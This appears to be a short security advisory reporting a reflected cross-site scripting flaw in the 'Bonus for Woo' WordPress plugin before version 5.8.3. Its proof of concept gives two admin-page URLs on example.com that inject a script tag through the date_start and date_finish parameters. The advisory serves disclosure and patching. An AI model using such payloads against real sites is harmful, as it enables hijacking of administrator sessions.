## WordPress Plugin Vulnerabilities

# Bonus for Woo < 5.8.3 - Reflected Cross-Site Scripting

### Description

The plugin does not sanitise and escape some parameters before outputting them back in pages, leading to Reflected Cross-Site Scripting which could be used against high privilege users such as admin.

### Proof of Concept

Make a logged in admin open one of the URL below
https://example.com/wp-admin/admin.php?page=bonus-for-woo%2Findex%2Flist\_history.php&date\_start=1"><script>alert(/XSS/)%3B<%2Fscript>
https://example.com/wp-admin/admin.php?page=bonus-for-woo%2Findex%2Flist\_history.php&date\_finish=1"><script>alert(/XSS/)%3B<%2Fscript>
